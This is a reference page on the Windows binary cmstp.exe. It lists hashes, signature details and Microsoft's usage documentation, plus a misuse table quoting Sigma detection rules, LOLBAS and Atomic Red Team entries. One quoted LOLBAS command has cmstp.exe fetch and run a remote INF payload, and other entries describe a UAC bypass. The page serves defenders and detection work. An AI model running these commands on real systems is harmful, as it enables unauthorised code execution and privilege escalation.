﻿---
title: cmstp.exe | Microsoft Connection Manager Profile Installer
excerpt: What is cmstp.exe?
---

# cmstp.exe 

* File Path: `C:\WINDOWS\system32\cmstp.exe`
* Description: Microsoft Connection Manager Profile Installer

## Screenshot

![cmstp.exe](screenshots/cmstp.exe-B7BDBC4B4B28C662BD4AE2C5A9C2FCD8-1.png)
![cmstp.exe](screenshots/cmstp.exe-D7AABFAB5BEFD53BA3A27BD48F3CC675-1.png)

## Hashes

Type | Hash
-- | --
MD5 | `D57251040FC3DB645062FD9166914A85`
SHA1 | `C19C2835D20D4B86849321132D7D7E0D724AB80C`
SHA256 | `6391B1B331AF29C25DD8E187E08E733746E078108131E3FD44979E0DA1EA2CEB`
SHA384 | `50D8709E93267259311A3265B5B8290DE524E8A4E93802D852D5BA7B2F240F63E3884F1100371B91A5CB27026D7A698C`
SHA512 | `2707807502499CAE8C382A5AA8B0FF0E94ED4BCA2EE7F9AF82EB554488CAA058942DD263BF085D45183C69E520219E73E6D28FB84DA742DA8BA47F8966D98787`
SSDEEP | `1536:joU9t6nsW/L+XqRsXo94FC9GiyY4cvR2jBWb/87BM++GWb+1JXn:MUTXARj4MH6cp0Wbk7BM+HWb+15n`

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CMSTP.EXE.MUI
* Product Name: Microsoft(R) Connection Manager
* Company Name: Microsoft Corporation
* File Version: 7.2.18362.1 (WinBuild.160101.0800)
* Product Version: 7.2.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `cmstp.exe` being misused. While `cmstp.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_cmstp_execution_by_access.yml) | `title: CMSTP Execution Process Access`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_cmstp_execution_by_access.yml) | `- https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_cmstp_execution_by_access.yml) | `- Legitimate CMSTP use (unlikely in modern enterprise environments)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml) | `title: CMSTP Execution Process Creation`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml) | `- https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml) | `- Legitimate CMSTP use (unlikely in modern enterprise environments)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml) | `# CMSTP Spawning Child Process`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml) | `ParentImage\|endswith: '\cmstp.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cmstp_com_object_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cmstp_com_object_access.yml) | `title: CMSTP UAC Bypass via COM Object Access`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cmstp_com_object_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cmstp_com_object_access.yml) | `- https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cmstp_com_object_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cmstp_com_object_access.yml) | `- Legitimate CMSTP use (unlikely in modern enterprise environments)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'cmstp.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\cmstp.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "cmstp.exe"`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '\cmstp.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_uac_cmstp.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_cmstp.yml) | `title: Bypass UAC via CMSTP`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_uac_cmstp.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_cmstp.yml) | `description: Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe).`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_uac_cmstp.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_cmstp.yml) | `Image\|endswith: '\cmstp.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_uac_cmstp.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_cmstp.yml) | `- Legitimate use of cmstp.exe utility by legitimate user`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_registry.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_cmstp_execution_by_registry.yml) | `title: CMSTP Execution Registry Event`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_registry.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_cmstp_execution_by_registry.yml) | `- https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cmstp_execution_by_registry.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_cmstp_execution_by_registry.yml) | `- Legitimate CMSTP use (unlikely in modern enterprise environments)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `Name: Cmstp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Path: C:\Windows\System32\cmstp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Path: C:\Windows\SysWOW64\cmstp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- IOC: Execution of cmstp.exe should not be normal unless VPN is in use`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- IOC: Cmstp.exe communication towards internet and getting files`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Link: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `- Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - [T1218.003 CMSTP](../../T1218.003/T1218.003.md) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: CMSTP Executing Remote Scriptlet [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: CMSTP Executing UAC Bypass [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - [T1218.003 CMSTP](../../T1218.003/T1218.003.md) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: CMSTP Executing Remote Scriptlet [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: CMSTP Executing UAC Bypass [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [matrix.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/matrix.md) | \| Hardware Additions [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| [Deploy Container](../../T1610/T1610.md) \| [At (Linux)](../../T1053.001/T1053.001.md) \| [At (Windows)](../../T1053.002/T1053.002.md) \| [CMSTP](../../T1218.003/T1218.003.md) \| [Credential Stuffing](../../T1110.004/T1110.004.md) \| [Domain Account](../../T1087.002/T1087.002.md) \| [Remote Desktop Protocol](../../T1021.001/T1021.001.md) \| [Credential API Hooking](../../T1056.004/T1056.004.md) \| [Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](../../T1048.003/T1048.003.md) \| Dead Drop Resolver [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| Disk Structure Wipe [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-matrix.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/windows-matrix.md) | \| [External Remote Services](../../T1133/T1133.md) \| Inter-Process Communication [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| [At (Windows)](../../T1053.002/T1053.002.md) \| [Asynchronous Procedure Call](../../T1055.004/T1055.004.md) \| [CMSTP](../../T1218.003/T1218.003.md) \| [Credentials from Password Stores](../../T1555/T1555.md) \| [File and Directory Discovery](../../T1083/T1083.md) \| [RDP Hijacking](../../T1563.002/T1563.002.md) \| [Clipboard Data](../../T1115/T1115.md) \| Exfiltration Over Physical Medium [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| Data Encoding [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| Direct Network Flood [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | # T1218.003 - CMSTP | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | <blockquote>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | - [Atomic Test #1 - CMSTP Executing Remote Scriptlet](#atomic-test-1---cmstp-executing-remote-scriptlet) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | - [Atomic Test #2 - CMSTP Executing UAC Bypass](#atomic-test-2---cmstp-executing-uac-bypass) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | ## Atomic Test #1 - CMSTP Executing Remote Scriptlet | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | Adversaries may supply CMSTP.exe with INF files infected with malicious commands | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | cmstp.exe /s #{inf_file_path} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | ## Atomic Test #2 - CMSTP Executing UAC Bypass | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | cmstp.exe /s #{inf_file_uac} /au | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## cmstp

>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Installs or removes a Connection Manager service profile. Used without optional parameters, **cmstp** installs a service profile with default settings appropriate to the operating system and to the user's permissions.

### Syntax

Syntax 1 - This is the typical syntax used in a custom installation application. To use this syntax, you must run **cmstp** from the directory that contains the `<serviceprofilefilename>.exe` file.

```
<serviceprofilefilename>.exe /q:a /c:cmstp.exe <serviceprofilefilename>.inf [/nf] [/s] [/u]
```

Syntax 2
```
cmstp.exe [/nf] [/s] [/u] [drive:][path]serviceprofilefilename.inf
```

##### Parameters
| Parameter | Description |
| --------- | ----------- |
| `<serviceprofilefilename>.exe` | Specifies, by name, the installation package that contains the profile that you want to install.<p>Required for Syntax 1, but not valid for Syntax 2. |
| /q:a | Specifies that the profile should be installed without prompting the user. The verification message that the installation has succeeded will still appear.<p>Required for Syntax 1, but not valid for Syntax 2. |
| [drive:][path] `<serviceprofilefilename>.inf` | Required. Specifies, by name, the configuration file that determines how the profile should be installed.<p>The [drive:][path] parameter isn't valid for Syntax 1. |
| /nf | Specifies that the support files should not be installed. |
| /s | Specifies that the service profile should be installed or uninstalled silently (without prompting for user response or displaying verification message). This is the only parameter that you can use in combination with **/u**.|
| /u | Specifies that the service profile should be uninstalled. |
| /? | Displays help at the command prompt. |

### Examples

To install the *fiction* service profile without any support files, type:

```
fiction.exe /c:cmstp.exe fiction.inf /nf
```

To silently install the *fiction* service profile for a single user, type:

```
fiction.exe /c:cmstp.exe fiction.inf /s /su
```

To silently uninstall the *fiction* service profile, type:

```
fiction.exe /c:cmstp.exe fiction.inf /s /u
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


